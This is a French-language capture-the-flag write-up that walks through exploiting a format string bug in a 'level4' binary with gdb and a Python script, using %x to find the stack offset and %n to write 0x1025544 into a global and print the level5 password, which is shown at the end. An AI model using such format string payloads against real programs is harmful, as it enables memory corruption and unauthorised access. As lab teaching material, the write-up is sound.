Je commence par desassembler le binaire level4 dans ghidra

Il y a une fonction n() et une fonction p() en plus de la fonction main()

La fonction main() appelle la fonction n() puis retourne.
La fonction n() fait un appel a fgets d'une taille de 512 dans un buffer de 520 puis appelle p() avec le buffer rempli par fgets en argument.
Il y a ensuite une condition:

Si m vaut 0x1025544, le binaire affiche le mot de passe de level5 avec system("/bin/cat /home/user/level5/.pass")

La fonction p() execute printf() avec le buffer de fgets en parametre.

Je comprend immediatement que mon but est d'arriver a rentrer dans cette condition pour obtenir le mot de passe de level5.

Ca ressemble beaucoup au level3 mais cette fois l'appel a printf se fait dans une autre fonction.

Mon but est donc de reussir a ecrire sur la zone memoire de la variable m pour lui donner la valeur 0x1025544 et ainsi obtenir le mot de passe de level5.

Pour commencer il faut que je trouve la zone memoire sur laquelle je peux ecrire grace a ce printf:

Pour cela je vais commencer par poser un breakpoint juste apres l'appel a printf dans gdb et je vais input au binaire une chaine de caractere qui va me permettre d'obtenir des informations sur la zone memoire que je peux manipuler.

$>gdb level4
(gdb)disas p
Dump of assembler code for function p:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x8(%ebp),%eax
   0x0804844d <+9>:	mov    %eax,(%esp)
   0x08048450 <+12>:	call   0x8048340 <printf@plt>
   0x08048455 <+17>:	leave
   0x08048456 <+18>:	ret
End of assembler dump.


Je vais mettre mon breakpoint sur l'instruction qui suit l'appel a printf donc a l'adresse 0x08048455

Le programme attend un input, je vais lui donner "AAAA.%x.%x.%x.%x."

(gdb)b *0x08048455
(gdb)r
Starting program: /home/user/level4/level4
AAAA.%x.%x.%x.%x.
AAAA.b7ff26b0.bffff734.b7fd0ff4.0.

Le programme print "AAAA.b7ff26b0.bffff734.b7fd0ff4.0.".

Grace au level3 je sais qu'il sagit d'une sequence d'adresses memoire.

Si je recherche dans la frame a ce meme contexte (au breakpoint que j'ai pose plus tot) je peux peut etre trouver la meme sequence d'adresses.

Pour examiner cette frame je lance x/32x $esp

(gdb)x/32x $esp
0xbffff4c0:	0xbffff4f0	0xb7ff26b0	0xbffff734	0xb7fd0ff4
0xbffff4d0:	0x00000000	0x00000000	0xbffff6f8	0x0804848d
0xbffff4e0:	0xbffff4f0	0x00000200	0xb7fd1ac0	0xb7ff37d0
0xbffff4f0:	0x41414141	0x2e78252e	0x252e7825	0x78252e78
0xbffff500:	0xbf000a2e	0xb7fde2d4	0xb7fde334	0x00000007
0xbffff510:	0x00000000	0xb7fde000	0xb7fff53c	0xbffff558
0xbffff520:	0x00000040	0x00000b80	0x00000000	0xb7fde714
0xbffff530:	0x00000098	0x0000000b	0x00000000	0x00000000

Sur la quatrieme ligne je retrouve une adresse qui vaut 0x41414141, il sagit de mes 4 'A'.
Sur la premiere ligne je retrouve la sequence que je cherche:
0xb7ff26b0	0xbffff734	0xb7fd0ff4

La sequence commence exactement 12 sections avant l'adresse qui a ete ecrite avec les 'A', donc il me faut 12 specificateurs de format dans printf pour arriver a cette adresse.
En effet si je run a nouveau le binaire mais avec 12 sepcificateurs cette fois ci on obtient:

(gdb)r
Starting program: /home/user/level4/level4
AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.
AAAA.b7ff26b0.bffff734.b7fd0ff4.0.0.bffff6f8.804848d.bffff4f0.200.b7fd1ac0.b7ff37d0.41414141.

On obtient la sequence entiere, jusqu'a nos 'A', aka la zone memoire ou je peut ecrire.

Maintenant que je sais ou je dois ecrire, il me faut l'adresse de la variable m.

(gdb)p &m
$1 = (<data variable, no debug info> *) 0x8049810

L'adresse de m est 0x8049810

Je peux maintenant commencer a ecrire mon script d'exploitation.

Je vais ecrire ce script en python etape par etape:

Je commence simplement par me mettre les droits sur le dossier et creer un fichier script.py

$>chmod 777 .
$>touch script.py
$>chmod 777 script.py

Premiere etape: ecrire le bon nombre de specificateurs de format pour arriver a l'adresse modifiable.

#!/usr/bin/env python

import os
import struct

def main():
    payload = "AAAA."
    payload += "%x."*12
    print payload

main()

Je test:

$> ./script.py | ./level4
AAAA.b7ff26b0.bffff754.b7fd0ff4.0.0.bffff718.804848d.bffff510.200.b7fd1ac0.b7ff37d0.41414141.

J'ai bien recupere l'adresse qui m'interesse.


Deuxieme etape: remplacer les A par l'adresse de m, parce que c'est a cette adresse la qu'on veut ecrire

#!/usr/bin/env python

import os
import struct

def main():
    payload = ""
    payload += struct.pack("I", 0x8049810)
    payload += "%x."*12
    print payload

main()

Je test:

$> ./srcipt.py | ./level4
b7ff26b0.bffff754.b7fd0ff4.0.0.bffff718.804848d.bffff510.200.b7fd1ac0.b7ff37d0.8049810.

J'ai bien remplace les 'A' par l'adresse de m


Troisieme etape: Ecrire

Si le specificateur %x permet de lire, le specificateur %n permet lui d'ecrire.

Le %n doit lire l'adresse a laquelle nous souhaitons ecrire, l'adresse de la variable m
Je remplace donc le dernier %x par un %n pour qu'il n'affiche pas l'adresse mais qu'il la lise.
Le script ressemble desormais a ca:

#!/usr/bin/env python

import os
import struct

def main():
    payload = ""
    payload += struct.pack("I", 0x8049810)
    payload += "%x."*11
    payload += "%n."
    print payload

main()

Je test:

$> ./script.py | ./level4
b7ff26b0.bffff754.b7fd0ff4.0.0.bffff718.804848d.bffff510.200.b7fd1ac0.b7ff37d0..

La valeur a bien ete lue, on a le '.' du %n qui apparait a la fin de la chaine.


Derniere etape: ecrire la valeur 0x1025544 dans la variable m

Pour cela il faut ecrire la valeur qu'on souhaite ajouter dans un specificateur de format %x avant le %n

=> %<value>x

La valeur va s'ajouter a celle deja presente a l'adresse sur laquelle on ecrit.
Pour connaitre la valeur de cette adresse au moment du 'if' il suffit de poser un breakpoint a ce meme moment dans gdb et de regarder la valeur contenue dans eax:

Je vais commencer en testant avec un 0 pour avoir la valeur de eax non modifee, le script ressemble a ca:


#!/usr/bin/env python

import os
import struct

def main():
    payload = ""
    payload += struct.pack("I", 0x8049810)
    payload += "%x."*10
    payload += "%0x."
    payload += "%n."
    print payload

main()



Avant il faut seulement ecrire l'output de mon script dans un fichier pour l'utiliser en input dans gdb:

$> ./script.py > out
$>chmod 777 out

(gdb)disas n
Dump of assembler code for function n:
   0x08048457 <+0>:	push   %ebp
   0x08048458 <+1>:	mov    %esp,%ebp
   0x0804845a <+3>:	sub    $0x218,%esp
   0x08048460 <+9>:	mov    0x8049804,%eax
   0x08048465 <+14>:	mov    %eax,0x8(%esp)
   0x08048469 <+18>:	movl   $0x200,0x4(%esp)
   0x08048471 <+26>:	lea    -0x208(%ebp),%eax
   0x08048477 <+32>:	mov    %eax,(%esp)
   0x0804847a <+35>:	call   0x8048350 <fgets@plt>
   0x0804847f <+40>:	lea    -0x208(%ebp),%eax
   0x08048485 <+46>:	mov    %eax,(%esp)
   0x08048488 <+49>:	call   0x8048444 <p>
   0x0804848d <+54>:	mov    0x8049810,%eax
   0x08048492 <+59>:	cmp    $0x1025544,%eax
   0x08048497 <+64>:	jne    0x80484a5 <n+78>
   0x08048499 <+66>:	movl   $0x8048590,(%esp)
   0x080484a0 <+73>:	call   0x8048360 <system@plt>
   0x080484a5 <+78>:	leave
   0x080484a6 <+79>:	ret
End of assembler dump.

L'instruction qui nous interesse est le 'if', il se trouve a la ligne ou il y a l'instruction 'cmp', son adresse est 0x08048492

(gdb) b *0x08048492
Breakpoint 1 at 0x8048492
(gdb) r < out
Starting program: /home/user/level4/level4 < out
b7ff26b0.bffff734.b7fd0ff4.0.0.bffff6f8.804848d.bffff4f0.200.b7fd1ac0.b7ff37d0..

Breakpoint 1, 0x08048492 in n ()
(gdb) info register
eax            0x53	83
ecx            0x0	0
edx            0x0	0
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff4e0	0xbffff4e0
ebp            0xbffff6f8	0xbffff6f8
esi            0x0	0
edi            0x0	0
eip            0x8048492	0x8048492 <n+59>
eflags         0x200286	[ PF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51

On voit ici que eax vaut 0x53 soit 83 en decimal, notre but est de lui donner la valeur 0x1025544 soit 16930116 en decimal.

16930116 - 83 = 16930033

Mais les specificateurs de formats et les '.' que j'ai mit dans le buffer de printf comptent egalement, on a donc:

16930033 + 8 = 16930041

Il faut que j'ecrive la valeur 16930041 dans m.

Le script final est le suivant:


#!/usr/bin/env python

import os
import struct

def main():
    payload = ""
    payload += struct.pack("I", 0x8049810)
    payload += "%x."*10
    payload += "%16930041x."
    payload += "%n."
    print payload

main()

Je test d'abord dans gdb:

(gdb)b *0x080484d92
(gdb)r < out
Starting program: /home/user/level4/level4 < out
Breakpoint 1, 0x08048492 in n ()
(gdb) info register
eax            0x1025544	16930116
ecx            0x0	0
edx            0x0	0
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff4e0	0xbffff4e0
ebp            0xbffff6f8	0xbffff6f8
esi            0x0	0
edi            0x0	0
eip            0x8048492	0x8048492 <n+59>
eflags         0x200286	[ PF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51

Et voila, la valeur de eax a bien ete changee pour 0x1025544 au moment du 'if', il est temps de tester sans gdb:

Je dois ecrire le renvoi du script dans un fichier puis le passer a level4 par un pipe en utilisant le '-' pour garder le shell actif.

$>./script.py > out && cat out - | ./level4
                                                                                                                                                                                                                                                                                                                                                                                                                   b7ff37d0..
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
